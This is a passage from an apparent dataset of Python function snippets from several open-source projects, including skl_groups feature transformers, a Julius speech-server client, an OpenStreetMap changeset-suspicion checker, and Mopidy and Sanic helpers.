            "def fit(self, X, y=None):\n        '''\n        Learn the transformation to shifted eigenvalues. Only depends\n        on the input dimension.\n\n        Parameters\n        ----------\n        X : array, shape [n, n]\n            The *symmetric* input similarities.\n        '''\n        n = X.shape[0]\n        if X.shape != (n, n):\n            raise TypeError(\"Input must be a square matrix.\")\n\n        self.train_ = X\n\n        memory = get_memory(self.memory)\n        lo, = memory.cache(scipy.linalg.eigvalsh)(X, eigvals=(0, 0))\n        self.shift_ = max(self.min_eig - lo, 0)\n\n        return self"
        ],
        [
            "def transform(self, X):\n        '''\n        Transforms X according to the linear transformation corresponding to\n        shifting the input eigenvalues to all be at least ``self.min_eig``.\n\n        Parameters\n        ----------\n        X : array, shape [n_test, n]\n            The test similarities to training points.\n\n        Returns\n        -------\n        Xt : array, shape [n_test, n]\n            The transformed test similarites to training points. Only different\n            from X if X is the training data.\n        '''\n        n = self.train_.shape[0]\n        if X.ndim != 2 or X.shape[1] != n:\n            msg = \"X should have {} columns, the number of samples at fit time\"\n            raise TypeError(msg.format(n))\n\n        if self.copy:\n            X = X.copy()\n\n        if self.shift_ != 0 and X is self.train_ or (\n                X.shape == self.train_.shape and np.allclose(X, self.train_)):\n            X[xrange(n), xrange(n)] += self.shift_\n        return X"
        ],
        [
            "def fit(self, X, y=None):\n        '''\n        Picks the elements of the basis to use for the given data.\n\n        Only depends on the dimension of X. If it's more convenient, you can\n        pass a single integer for X, which is the dimension to use.\n\n        Parameters\n        ----------\n        X : an integer, a :class:`Features` instance, or a list of bag features\n            The input data, or just its dimension, since only the dimension is\n            needed here.\n        '''\n        if is_integer(X):\n            dim = X\n        else:\n            X = as_features(X)\n            dim = X.dim\n        M = self.smoothness\n\n        # figure out the smooth-enough elements of our basis\n        inds = np.mgrid[(slice(M + 1),) * dim].reshape(dim, (M + 1) ** dim).T\n        self.inds_ = inds[(inds ** 2).sum(axis=1) <= M ** 2]\n        return self"
        ],
        [
            "def transform(self, X):\n        '''\n        Transform a list of bag features into its projection series\n        representation.\n\n        Parameters\n        ----------\n        X : :class:`skl_groups.features.Features` or list of bag feature arrays\n            New data to transform. The data should all lie in [0, 1];\n            use :class:`skl_groups.preprocessing.BagMinMaxScaler` if not.\n\n        Returns\n        -------\n        X_new : integer array, shape ``[len(X), dim_]``\n            X transformed into the new space.\n        '''\n        self._check_fitted()\n        M = self.smoothness\n        dim = self.dim_\n        inds = self.inds_\n        do_check = self.do_bounds_check\n\n        X = as_features(X)\n        if X.dim != dim:\n            msg = \"model fit for dimension {} but got dim {}\"\n            raise ValueError(msg.format(dim, X.dim))\n\n        Xt = np.empty((len(X), self.inds_.shape[0]))\n        Xt.fill(np.nan)\n\n        if self.basis == 'cosine':  # TODO: put this in a C extension?\n            coefs = (np.pi * np.arange(M + 1))[..., :]\n            for i, bag in enumerate(X):\n                if do_check:\n                    if np.min(bag) < 0 or np.max(bag) > 1:\n                        raise ValueError(\"Bag {} not in [0, 1]\".format(i))\n\n                # apply each phi func to each dataset point: n x dim x M\n                phi = coefs * bag[..., np.newaxis]\n                np.cos(phi, out=phi)\n                phi[:, :, 1:] *= np.sqrt(2)\n\n                # B is the evaluation of each tensor-prodded basis func\n                # at each point: n x inds.shape[0]\n                B = reduce(op.mul, (phi[:, i, inds[:, i]] for i in xrange(dim)))\n\n                Xt[i, :] = np.mean(B, axis=0)\n        else:\n            raise ValueError(\"unknown basis '{}'\".format(self.basis))\n\n        return Xt"
        ],
        [
            "def get_version(self): \n        \"\"\"\n        Get distribution version.\n\n        This method is enhanced compared to original distutils implementation.\n        If the version string is set to a special value then instead of using\n        the actual value the real version is obtained by querying versiontools.\n\n        If versiontools package is not installed then the version is obtained\n        from the standard section of the ``PKG-INFO`` file. This file is\n        automatically created by any source distribution. This method is less\n        useful as it cannot take advantage of version control information that\n        is automatically loaded by versiontools. It has the advantage of not\n        requiring versiontools installation and that it does not depend on\n        ``setup_requires`` feature of ``setuptools``.\n        \"\"\"\n        if (self.name is not None and self.version is not None\n            and self.version.startswith(\":versiontools:\")):\n            return (self.__get_live_version() or self.__get_frozen_version()\n                    or self.__fail_to_get_any_version())\n        else:\n            return self.__base.get_version(self)"
        ],
        [
            "def __get_live_version(self):\n        \"\"\"\n        Get a live version string using versiontools\n        \"\"\"\n        try:\n            import versiontools\n        except ImportError:\n            return None\n        else:\n            return str(versiontools.Version.from_expression(self.name))"
        ],
        [
            "def fit(self, X, y=None, **params):\n        '''\n        Fit the transformer on the stacked points.\n\n        Parameters\n        ----------\n        X : :class:`Features` or list of arrays of shape ``[n_samples[i], n_features]``\n            Training set. If a Features object, it will be stacked.\n\n        any other keyword argument :\n            Passed on as keyword arguments to the transformer's ``fit()``.\n        '''\n        X = as_features(X, stack=True)\n        self.transformer.fit(X.stacked_features, y, **params)\n        return self"
        ],
        [
            "def transform(self, X, **params):\n        '''\n        Transform the stacked points.\n\n        Parameters\n        ----------\n        X : :class:`Features` or list of bag feature arrays\n            New data to transform.\n\n        any other keyword argument :\n            Passed on as keyword arguments to the transformer's ``transform()``.\n\n        Returns\n        -------\n        X_new : :class:`Features`\n            Transformed features.\n        '''\n        X = as_features(X, stack=True)\n        X_new = self.transformer.transform(X.stacked_features, **params)\n        return self._gather_outputs(X, X_new)"
        ],
        [
            "def fit_transform(self, X, y=None, **params):\n        '''\n        Fit and transform the stacked points.\n\n        Parameters\n        ----------\n        X : :class:`Features` or list of bag feature arrays\n            Data to train on and transform.\n\n        any other keyword argument :\n            Passed on as keyword arguments to the transformer's ``transform()``.\n\n        Returns\n        -------\n        X_new : :class:`Features`\n            Transformed features.\n        '''\n        X = as_features(X, stack=True)\n        X_new = self.transformer.fit_transform(X.stacked_features, y, **params)\n        return self._gather_outputs(X, X_new)"
        ],
        [
            "def fit(self, X, y=None):\n        \"\"\"Compute the minimum and maximum to be used for later scaling.\n\n        Parameters\n        ----------\n        X : array-like, shape [n_samples, n_features]\n            The data used to compute the per-feature minimum and maximum\n            used for later scaling along the features axis.\n        \"\"\"\n        X = check_array(X, copy=self.copy,\n                        dtype=[np.float64, np.float32, np.float16, np.float128])\n\n        feature_range = self.feature_range\n        if feature_range[0] >= feature_range[1]:\n            raise ValueError(\"Minimum of desired feature range must be smaller\"\n                             \" than maximum. Got %s.\" % str(feature_range))\n        if self.fit_feature_range is not None:\n            fit_feature_range = self.fit_feature_range\n            if fit_feature_range[0] >= fit_feature_range[1]:\n                raise ValueError(\"Minimum of desired (fit) feature range must \"\n                                 \"be smaller than maximum. Got %s.\"\n                                 % str(feature_range))\n            if (fit_feature_range[0] < feature_range[0] or\n                    fit_feature_range[1] > feature_range[1]):\n                raise ValueError(\"fit_feature_range must be a subset of \"\n                                 \"feature_range. Got %s, fit %s.\"\n                                 % (str(feature_range),\n                                    str(fit_feature_range)))\n            feature_range = fit_feature_range\n\n        data_min = np.min(X, axis=0)\n        data_range = np.max(X, axis=0) - data_min\n        # Do not scale constant features\n        data_range[data_range == 0.0] = 1.0\n        self.scale_ = (feature_range[1] - feature_range[0]) / data_range\n        self.min_ = feature_range[0] - data_min * self.scale_\n        self.data_range = data_range\n        self.data_min = data_min\n        return self"
        ],
        [
            "def transform(self, X):\n        \"\"\"Scaling features of X according to feature_range.\n\n        Parameters\n        ----------\n        X : array-like with shape [n_samples, n_features]\n            Input data that will be transformed.\n        \"\"\"\n        X = check_array(X, copy=self.copy)\n        X *= self.scale_\n        X += self.min_\n        if self.truncate:\n            np.maximum(self.feature_range[0], X, out=X)\n            np.minimum(self.feature_range[1], X, out=X)\n        return X"
        ],
        [
            "def inverse_transform(self, X):\n        \"\"\"Undo the scaling of X according to feature_range.\n\n        Note that if truncate is true, any truncated points will not\n        be restored exactly.\n\n        Parameters\n        ----------\n        X : array-like with shape [n_samples, n_features]\n            Input data that will be transformed.\n        \"\"\"\n        X = check_array(X, copy=self.copy)\n        X -= self.min_\n        X /= self.scale_\n        return X"
        ],
        [
            "def fit(self, X, y=None):\n        '''\n        Choose the codewords based on a training set.\n\n        Parameters\n        ----------\n        X : :class:`skl_groups.features.Features` or list of arrays of shape ``[n_samples[i], n_features]``\n            Training set. If a Features object, it will be stacked.\n        '''\n        self.kmeans_fit_ = copy(self.kmeans)\n        X = as_features(X, stack=True)\n        self.kmeans_fit_.fit(X.stacked_features) \n        return self"
        ],
        [
            "def transform(self, X):\n        '''\n        Transform a list of bag features into its bag-of-words representation.\n\n        Parameters\n        ----------\n        X : :class:`skl_groups.features.Features` or list of bag feature arrays\n            New data to transform.\n\n        Returns\n        -------\n        X_new : integer array, shape [len(X), kmeans.n_clusters]\n            X transformed into the new space.\n        '''\n        self._check_fitted()\n        X = as_features(X, stack=True)\n        assignments = self.kmeans_fit_.predict(X.stacked_features)\n        return self._group_assignments(X, assignments)"
        ],
        [
            "def is_categorical_type(ary):\n    \"Checks whether the array is either integral or boolean.\"\n    ary = np.asanyarray(ary)\n    return is_integer_type(ary) or ary.dtype.kind == 'b'"
        ],
        [
            "def as_integer_type(ary):\n    '''\n    Returns argument as an integer array, converting floats if convertable.\n    Raises ValueError if it's a float array with nonintegral values.\n    '''\n    ary = np.asanyarray(ary)\n    if is_integer_type(ary):\n        return ary\n    rounded = np.rint(ary)\n    if np.any(rounded != ary):\n        raise ValueError(\"argument array must contain only integers\")\n    return rounded.astype(int)"
        ],
        [
            "def start(self, total):\n        '''\n        Signal the start of the process.\n\n        Parameters\n        ----------\n        total : int\n            The total number of steps in the process, or None if unknown.\n        '''\n        self.logger.info(json.dumps(['START', self.name, total]))"
        ],
        [
            "def _build_indices(X, flann_args):\n    \"Builds FLANN indices for each bag.\"\n    # TODO: should probably multithread this\n    logger.info(\"Building indices...\")\n    indices = [None] * len(X)\n    for i, bag in enumerate(plog(X, name=\"index building\")):\n        indices[i] = idx = FLANNIndex(**flann_args)\n        idx.build_index(bag)\n    return indices"
        ],
        [
            "def _get_rhos(X, indices, Ks, max_K, save_all_Ks, min_dist):\n    \"Gets within-bag distances for each bag.\"\n    logger.info(\"Getting within-bag distances...\")\n\n    if max_K >= X.n_pts.min():\n        msg = \"asked for K = {}, but there's a bag with only {} points\"\n        raise ValueError(msg.format(max_K, X.n_pts.min()))\n\n    # need to throw away the closest neighbor, which will always be self\n    # thus K=1 corresponds to column 1 in the result array\n    which_Ks = slice(1, None) if save_all_Ks else Ks\n\n    indices = plog(indices, name=\"within-bag distances\")\n    rhos = [None] * len(X)\n    for i, (idx, bag) in enumerate(zip(indices, X)):\n        r = np.sqrt(idx.nn_index(bag, max_K + 1)[1][:, which_Ks])\n        np.maximum(min_dist, r, out=r)\n        rhos[i] = r\n    return rhos"
        ],
        [
            "def linear(Ks, dim, num_q, rhos, nus):\n    r'''\n    Estimates the linear inner product \\int p q between two distributions,\n    based on kNN distances.\n    '''\n    return _get_linear(Ks, dim)(num_q, rhos, nus)"
        ],
        [
            "def quadratic(Ks, dim, rhos, required=None):\n    r'''\n    Estimates \\int p^2 based on kNN distances.\n\n    In here because it's used in the l2 distance, above.\n\n    Returns array of shape (num_Ks,).\n    '''\n    # Estimated with alpha=1, beta=0:\n    #   B_{k,d,1,0} is the same as B_{k,d,0,1} in linear()\n    # and the full estimator is\n    #   B / (n - 1) * mean(rho ^ -dim)\n    N = rhos.shape[0]\n    Ks = np.asarray(Ks)\n    Bs = (Ks - 1) / np.pi ** (dim / 2) * gamma(dim / 2 + 1)  # shape (num_Ks,)\n    est = Bs / (N - 1) * np.mean(rhos ** (-dim), axis=0)\n    return est"
        ],
        [
            "def topological_sort(deps):\n    '''\n    Topologically sort a DAG, represented by a dict of child => set of parents.\n    The dependency dict is destroyed during operation.\n\n    Uses the Kahn algorithm: http://en.wikipedia.org/wiki/Topological_sorting\n    Not a particularly good implementation, but we're just running it on tiny\n    graphs.\n    '''\n    order = []\n    available = set()\n\n    def _move_available():\n        to_delete = []\n        for n, parents in iteritems(deps):\n            if not parents:\n                available.add(n)\n                to_delete.append(n)\n        for n in to_delete:\n            del deps[n]\n\n    _move_available()\n    while available:\n        n = available.pop()\n        order.append(n)\n        for parents in itervalues(deps):\n            parents.discard(n)\n        _move_available()\n\n    if available:\n        raise ValueError(\"dependency cycle found\")\n    return order"
        ],
        [
            "def _get_Ks(self):\n        \"Ks as an array and type-checked.\"\n        Ks = as_integer_type(self.Ks)\n        if Ks.ndim != 1:\n            raise TypeError(\"Ks should be 1-dim, got shape {}\".format(Ks.shape))\n        if Ks.min() < 1:\n            raise ValueError(\"Ks should be positive; got {}\".format(Ks.min()))\n        return Ks"
        ],
        [
            "def _flann_args(self, X=None):\n        \"The dictionary of arguments to give to FLANN.\"\n        args = {'cores': self._n_jobs}\n        if self.flann_algorithm == 'auto':\n            if X is None or X.dim > 5:\n                args['algorithm'] = 'linear'\n            else:\n                args['algorithm'] = 'kdtree_single'\n        else:\n            args['algorithm'] = self.flann_algorithm\n        if self.flann_args:\n            args.update(self.flann_args)\n\n        # check that arguments are correct\n        try:\n            FLANNParameters().update(args)\n        except AttributeError as e:\n            msg = \"flann_args contains an invalid argument:\\n  {}\"\n            raise TypeError(msg.format(e))\n\n        return args"
        ],
        [
            "def fit(self, X, y=None, get_rhos=False):\n        '''\n        Sets up for divergence estimation \"from\" new data \"to\" X.\n        Builds FLANN indices for each bag, and maybe gets within-bag distances.\n\n        Parameters\n        ----------\n        X : list of arrays or :class:`skl_groups.features.Features`\n            The bags to search \"to\".\n\n        get_rhos : boolean, optional, default False\n            Compute within-bag distances :attr:`rhos_`. These are only needed\n            for some divergence functions or if do_sym is passed, and they'll\n            be computed (and saved) during :meth:`transform` if they're not\n            computed here.\n\n            If you're using Jensen-Shannon divergence, a higher max_K may\n            be needed once it sees the number of points in the transformed bags,\n            so the computation here might be wasted.\n        '''\n        self.features_ = X = as_features(X, stack=True, bare=True)\n\n        # if we're using a function that needs to pick its K vals itself,\n        # then we need to set max_K here. when we transform(), might have to\n        # re-do this :|\n        Ks = self._get_Ks()\n        _, _, _, max_K, save_all_Ks, _ = _choose_funcs(\n            self.div_funcs, Ks, X.dim, X.n_pts, None, self.version)\n\n        if max_K >= X.n_pts.min():\n            msg = \"asked for K = {}, but there's a bag with only {} points\"\n            raise ValueError(msg.format(max_K, X.n_pts.min()))\n\n        memory = self.memory\n        if isinstance(memory, string_types):\n            memory = Memory(cachedir=memory, verbose=0)\n\n        self.indices_ = id = memory.cache(_build_indices)(X, self._flann_args())\n        if get_rhos:\n            self.rhos_ = _get_rhos(X, id, Ks, max_K, save_all_Ks, self.min_dist)\n        elif hasattr(self, 'rhos_'):\n            del self.rhos_\n        return self"
        ],
        [
            "def make_stacked(self):\n        \"If unstacked, convert to stacked. If stacked, do nothing.\"\n        if self.stacked:\n            return\n\n        self._boundaries = bounds = np.r_[0, np.cumsum(self.n_pts)]\n        self.stacked_features = stacked = np.vstack(self.features)\n        self.features = np.array(\n            [stacked[bounds[i-1]:bounds[i]] for i in xrange(1, len(bounds))],\n            dtype=object)\n        self.stacked = True"
        ],
        [
            "def copy(self, stack=False, copy_meta=False, memo=None):\n        '''\n        Copies the Feature object. Makes a copy of the features array.\n\n        Parameters\n        ----------\n        stack : boolean, optional, default False\n            Whether to stack the copy if this one is unstacked.\n\n        copy_meta : boolean, optional, default False\n            Also copy the metadata. If False, metadata in both points to the\n            same object.\n        '''\n        if self.stacked:\n            fs = deepcopy(self.stacked_features, memo)\n            n_pts = self.n_pts.copy()\n        elif stack:\n            fs = np.vstack(self.features)\n            n_pts = self.n_pts.copy()\n        else:\n            fs = deepcopy(self.features, memo)\n            n_pts = None\n\n        meta = deepcopy(self.meta, memo) if copy_meta else self.meta\n        return Features(fs, n_pts, copy=False, **meta)"
        ],
        [
            "def bare(self):\n        \"Make a Features object with no metadata; points to the same features.\"\n        if not self.meta:\n            return self\n        elif self.stacked:\n            return Features(self.stacked_features, self.n_pts, copy=False)\n        else:\n            return Features(self.features, copy=False)"
        ],
        [
            "def fit(self, X, y=None):\n        '''\n        Specify the data to which kernel values should be computed.\n\n        Parameters\n        ----------\n        X : list of arrays or :class:`skl_groups.features.Features`\n            The bags to compute \"to\".\n        '''\n        self.features_ = as_features(X, stack=True, bare=True)\n        # TODO: could precompute things like squared norms if kernel == \"rbf\".\n        # Probably should add support to sklearn instead of hacking it here.\n        return self"
        ],
        [
            "def transform(self, X):\n        '''\n        Transform a list of bag features into a matrix of its mean features.\n\n        Parameters\n        ----------\n        X : :class:`skl_groups.features.Features` or list of bag feature arrays\n            Data to transform.\n\n        Returns\n        -------\n        X_new : array, shape ``[len(X), X.dim]``\n            X transformed into its means.\n        '''\n        X = as_features(X)\n        return np.vstack([np.mean(bag, axis=0) for bag in X])"
        ],
        [
            "def run(self):\n        \"\"\"Start listening to the server\"\"\"\n        logger.info(u'Started listening')\n        while not self._stop:\n            xml = self._readxml()\n\n            # Exit on invalid XML\n            if xml is None:\n                break\n\n            # Raw xml only\n            if not self.modelize:\n                logger.info(u'Raw xml: %s' % xml)\n                self.results.put(xml)\n                continue\n\n            # Model objects + raw xml as fallback\n            if xml.tag == 'RECOGOUT':\n                sentence = Sentence.from_shypo(xml.find('SHYPO'), self.encoding)\n                logger.info(u'Modelized recognition: %r' % sentence)\n                self.results.put(sentence)\n            else:\n                logger.info(u'Unmodelized xml: %s' % xml)\n                self.results.put(xml)\n\n        logger.info(u'Stopped listening')"
        ],
        [
            "def connect(self):\n        \"\"\"Connect to the server\n\n        :raise ConnectionError: If socket cannot establish a connection\n\n        \"\"\"\n        try:\n            logger.info(u'Connecting %s:%d' % (self.host, self.port))\n            self.sock.connect((self.host, self.port))\n        except socket.error:\n            raise ConnectionError()\n        self.state = CONNECTED"
        ],
        [
            "def disconnect(self):\n        \"\"\"Disconnect from the server\"\"\"\n        logger.info(u'Disconnecting')\n        self.sock.shutdown(socket.SHUT_RDWR)\n        self.sock.close()\n        self.state = DISCONNECTED"
        ],
        [
            "def send(self, command, timeout=5):\n        \"\"\"Send a command to the server\n\n        :param string command: command to send\n\n        \"\"\"\n        logger.info(u'Sending %s' % command)\n        _, writable, __ = select.select([], [self.sock], [], timeout)\n        if not writable:\n            raise SendTimeoutError()\n        writable[0].sendall(command + '\\n')"
        ],
        [
            "def _readline(self):\n        \"\"\"Read a line from the server. Data is read from the socket until a character ``\\n`` is found\n\n        :return: the read line\n        :rtype: string\n\n        \"\"\"\n        line = ''\n        while 1:\n            readable, _, __ = select.select([self.sock], [], [], 0.5)\n            if self._stop:\n                break\n            if not readable:\n                continue\n            data = readable[0].recv(1)\n            if data == '\\n':\n                break\n            line += unicode(data, self.encoding)\n        return line"
        ],
        [
            "def _readblock(self):\n        \"\"\"Read a block from the server. Lines are read until a character ``.`` is found\n\n        :return: the read block\n        :rtype: string\n\n        \"\"\"\n        block = ''\n        while not self._stop:\n            line = self._readline()\n            if line == '.':\n                break\n            block += line\n        return block"
        ],
        [
            "def _readxml(self):\n        \"\"\"Read a block and return the result as XML\n\n        :return: block as xml\n        :rtype: xml.etree.ElementTree\n\n        \"\"\"\n        block = re.sub(r'<(/?)s>', r'&lt;\\1s&gt;', self._readblock())\n        try:\n            xml = XML(block)\n        except ParseError:\n            xml = None\n        return xml"
        ],
        [
            "def cli(id):\n    \"\"\"Analyse an OpenStreetMap changeset.\"\"\"\n    ch = Analyse(id)\n    ch.full_analysis()\n    click.echo(\n        'Created: %s. Modified: %s. Deleted: %s' % (ch.create, ch.modify, ch.delete)\n        )\n    if ch.is_suspect:\n        click.echo('The changeset {} is suspect! Reasons: {}'.format(\n            id,\n            ', '.join(ch.suspicion_reasons)\n            ))\n    else:\n        click.echo('The changeset %s is not suspect!' % id)"
        ],
        [
            "def get_user_details(user_id):\n    \"\"\"Get information about number of changesets, blocks and mapping days of a\n    user, using both the OSM API and the Mapbox comments APIself.\n    \"\"\"\n    reasons = []\n    try:\n        url = OSM_USERS_API.format(user_id=requests.compat.quote(user_id))\n        user_request = requests.get(url)\n        if user_request.status_code == 200:\n            user_data = user_request.content\n            xml_data = ET.fromstring(user_data).getchildren()[0].getchildren()\n            changesets = [i for i in xml_data if i.tag == 'changesets'][0]\n            blocks = [i for i in xml_data if i.tag == 'blocks'][0]\n            if int(changesets.get('count')) <= 5:\n                reasons.append('New mapper')\n            elif int(changesets.get('count')) <= 30:\n                url = MAPBOX_USERS_API.format(\n                    user_id=requests.compat.quote(user_id)\n                    )\n                user_request = requests.get(url)\n                if user_request.status_code == 200:\n                    mapping_days = int(\n                        user_request.json().get('extra').get('mapping_days')\n                        )\n                    if mapping_days <= 5:\n                        reasons.append('New mapper')\n            if int(blocks.getchildren()[0].get('count')) > 1:\n                reasons.append('User has multiple blocks')\n    except Exception as e:\n        message = 'Could not verify user of the changeset: {}, {}'\n        print(message.format(user_id, str(e)))\n    return reasons"
        ],
        [
            "def changeset_info(changeset):\n    \"\"\"Return a dictionary with id, user, user_id, bounds, date of creation\n    and all the tags of the changeset.\n\n    Args:\n        changeset: the XML string of the changeset.\n    \"\"\"\n    keys = [tag.attrib.get('k') for tag in changeset.getchildren()]\n    keys += ['id', 'user', 'uid', 'bbox', 'created_at']\n    values = [tag.attrib.get('v') for tag in changeset.getchildren()]\n    values += [\n        changeset.get('id'), changeset.get('user'), changeset.get('uid'),\n        get_bounds(changeset), changeset.get('created_at')\n        ]\n\n    return dict(zip(keys, values))"
        ],
        [
            "def get_changeset(changeset):\n    \"\"\"Get the changeset using the OSM API and return the content as a XML\n    ElementTree.\n\n    Args:\n        changeset: the id of the changeset.\n    \"\"\"\n    url = 'https://www.openstreetmap.org/api/0.6/changeset/{}/download'.format(\n        changeset\n        )\n    return ET.fromstring(requests.get(url).content)"
        ],
        [
            "def get_metadata(changeset):\n    \"\"\"Get the metadata of a changeset using the OSM API and return it as a XML\n    ElementTree.\n\n    Args:\n        changeset: the id of the changeset.\n    \"\"\"\n    url = 'https://www.openstreetmap.org/api/0.6/changeset/{}'.format(changeset)\n    return ET.fromstring(requests.get(url).content).getchildren()[0]"
        ],
        [
            "def get_area(self, geojson):\n        \"\"\"Read the first feature from the geojson and return it as a Polygon\n        object.\n        \"\"\"\n        geojson = json.load(open(geojson, 'r'))\n        self.area = Polygon(geojson['features'][0]['geometry']['coordinates'][0])"
        ],
        [
            "def filter(self):\n        \"\"\"Filter the changesets that intersects with the geojson geometry.\"\"\"\n        self.content = [\n            ch\n            for ch in self.xml.getchildren()\n            if get_bounds(ch).intersects(self.area)\n            ]"
        ],
        [
            "def set_fields(self, changeset):\n        \"\"\"Set the fields of this class with the metadata of the analysed\n        changeset.\n        \"\"\"\n        self.id = int(changeset.get('id'))\n        self.user = changeset.get('user')\n        self.uid = changeset.get('uid')\n        self.editor = changeset.get('created_by', None)\n        self.review_requested = changeset.get('review_requested', False)\n        self.host = changeset.get('host', 'Not reported')\n        self.bbox = changeset.get('bbox').wkt\n        self.comment = changeset.get('comment', 'Not reported')\n        self.source = changeset.get('source', 'Not reported')\n        self.imagery_used = changeset.get('imagery_used', 'Not reported')\n        self.date = datetime.strptime(\n            changeset.get('created_at'),\n            '%Y-%m-%dT%H:%M:%SZ'\n            )\n        self.suspicion_reasons = []\n        self.is_suspect = False\n        self.powerfull_editor = False"
        ],
        [
            "def label_suspicious(self, reason):\n        \"\"\"Add suspicion reason and set the suspicious flag.\"\"\"\n        self.suspicion_reasons.append(reason)\n        self.is_suspect = True"
        ],
        [
            "def full_analysis(self):\n        \"\"\"Execute the count and verify_words methods.\"\"\"\n        self.count()\n        self.verify_words()\n        self.verify_user()\n\n        if self.review_requested == 'yes':\n            self.label_suspicious('Review requested')"
        ],
        [
            "def verify_words(self):\n        \"\"\"Verify the fields source, imagery_used and comment of the changeset\n        for some suspect words.\n        \"\"\"\n        if self.comment:\n            if find_words(self.comment, self.suspect_words, self.excluded_words):\n                self.label_suspicious('suspect_word')\n\n        if self.source:\n            for word in self.illegal_sources:\n                if word in self.source.lower():\n                    self.label_suspicious('suspect_word')\n                    break\n\n        if self.imagery_used:\n            for word in self.illegal_sources:\n                if word in self.imagery_used.lower():\n                    self.label_suspicious('suspect_word')\n                    break\n\n        self.suspicion_reasons = list(set(self.suspicion_reasons))"
        ],
        [
            "def verify_editor(self):\n        \"\"\"Verify if the software used in the changeset is a powerfull_editor.\n        \"\"\"\n        powerful_editors = [\n            'josm', 'level0', 'merkaartor', 'qgis', 'arcgis', 'upload.py',\n            'osmapi', 'Services_OpenStreetMap'\n            ]\n        if self.editor is not None:\n            for editor in powerful_editors:\n                if editor in self.editor.lower():\n                    self.powerfull_editor = True\n                    break\n\n            if 'iD' in self.editor:\n                trusted_hosts = [\n                    'www.openstreetmap.org/id',\n                    'www.openstreetmap.org/edit',\n                    'improveosm.org',\n                    'strava.github.io/iD',\n                    'preview.ideditor.com/release',\n                    'preview.ideditor.com/master',\n                    'hey.mapbox.com/iD-internal',\n                    'projets.pavie.info/id-indoor',\n                    'maps.mapcat.com/edit',\n                    'id.softek.ir'\n                    ]\n                if self.host.split('://')[-1].strip('/') not in trusted_hosts:\n                    self.label_suspicious('Unknown iD instance')\n        else:\n            self.powerfull_editor = True\n            self.label_suspicious('Software editor was not declared')"
        ],
        [
            "def count(self):\n        \"\"\"Count the number of elements created, modified and deleted by the\n        changeset and analyses if it is a possible import, mass modification or\n        a mass deletion.\n        \"\"\"\n        xml = get_changeset(self.id)\n        actions = [action.tag for action in xml.getchildren()]\n        self.create = actions.count('create')\n        self.modify = actions.count('modify')\n        self.delete = actions.count('delete')\n        self.verify_editor()\n\n        try:\n            if (self.create / len(actions) > self.percentage and\n                    self.create > self.create_threshold and\n                    (self.powerfull_editor or self.create > self.top_threshold)):\n                self.label_suspicious('possible import')\n            elif (self.modify / len(actions) > self.percentage and\n                    self.modify > self.modify_threshold):\n                self.label_suspicious('mass modification')\n            elif ((self.delete / len(actions) > self.percentage and\n                    self.delete > self.delete_threshold) or\n                    self.delete > self.top_threshold):\n                self.label_suspicious('mass deletion')\n        except ZeroDivisionError:\n            print('It seems this changeset was redacted')"
        ],
        [
            "def _unwrap_stream(uri, timeout, scanner, requests_session):\n    \"\"\"\n    Get a stream URI from a playlist URI, ``uri``.\n    Unwraps nested playlists until something that's not a playlist is found or\n    the ``timeout`` is reached.\n    \"\"\"\n\n    original_uri = uri\n    seen_uris = set()\n    deadline = time.time() + timeout\n\n    while time.time() < deadline:\n        if uri in seen_uris:\n            logger.info(\n                'Unwrapping stream from URI (%s) failed: '\n                'playlist referenced itself', uri)\n            return None\n        else:\n            seen_uris.add(uri)\n\n        logger.debug('Unwrapping stream from URI: %s', uri)\n\n        try:\n            scan_timeout = deadline - time.time()\n            if scan_timeout < 0:\n                logger.info(\n                    'Unwrapping stream from URI (%s) failed: '\n                    'timed out in %sms', uri, timeout)\n                return None\n            scan_result = scanner.scan(uri, timeout=scan_timeout)\n        except exceptions.ScannerError as exc:\n            logger.debug('GStreamer failed scanning URI (%s): %s', uri, exc)\n            scan_result = None\n\n        if scan_result is not None and not (\n                scan_result.mime.startswith('text/') or\n                scan_result.mime.startswith('application/')):\n            logger.debug(\n                'Unwrapped potential %s stream: %s', scan_result.mime, uri)\n            return uri\n\n        download_timeout = deadline - time.time()\n        if download_timeout < 0:\n            logger.info(\n                'Unwrapping stream from URI (%s) failed: timed out in %sms',\n                uri, timeout)\n            return None\n        content = http.download(\n            requests_session, uri, timeout=download_timeout)\n\n        if content is None:\n            logger.info(\n                'Unwrapping stream from URI (%s) failed: '\n                'error downloading URI %s', original_uri, uri)\n            return None\n\n        uris = playlists.parse(content)\n        if not uris:\n            logger.debug(\n                'Failed parsing URI (%s) as playlist; found potential stream.',\n                uri)\n            return uri\n\n        # TODO Test streams and return first that seems to be playable\n        logger.debug(\n            'Parsed playlist (%s) and found new URI: %s', uri, uris[0])\n        uri = uris[0]"
        ],
        [
            "def serve(self, sock, request_handler, error_handler, debug=False,\n              request_timeout=60, ssl=None, request_max_size=None,\n              reuse_port=False, loop=None, protocol=HttpProtocol,\n              backlog=100, **kwargs):\n        \"\"\"Start asynchronous HTTP Server on an individual process.\n\n        :param request_handler: Sanic request handler with middleware\n        :param error_handler: Sanic error handler with middleware\n        :param debug: enables debug output (slows server)\n        :param request_timeout: time in seconds\n        :param ssl: SSLContext\n        :param sock: Socket for the server to accept connections from\n        :param request_max_size: size in bytes, `None` for no limit\n        :param reuse_port: `True` for multiple workers\n        :param loop: asyncio compatible event loop\n        :param protocol: subclass of asyncio protocol class\n        :return: Nothing\n        \"\"\"\n        if debug:\n            loop.set_debug(debug)\n\n        server = partial(\n            protocol,\n            loop=loop,\n            connections=self.connections,\n            signal=self.signal,\n            request_handler=request_handler,\n            error_handler=error_handler,\n            request_timeout=request_timeout,\n            request_max_size=request_max_size,\n        )\n\n        server_coroutine = loop.create_server(\n            server,\n            host=None,\n            port=None,\n            ssl=ssl,\n            reuse_port=reuse_port,\n            sock=sock,\n            backlog=backlog\n        )\n        # Instead of pulling time at the end of every request,\n        # pull it once per minute\n        loop.call_soon(partial(update_current_time, loop))\n        return server_coroutine"
        ],
        [
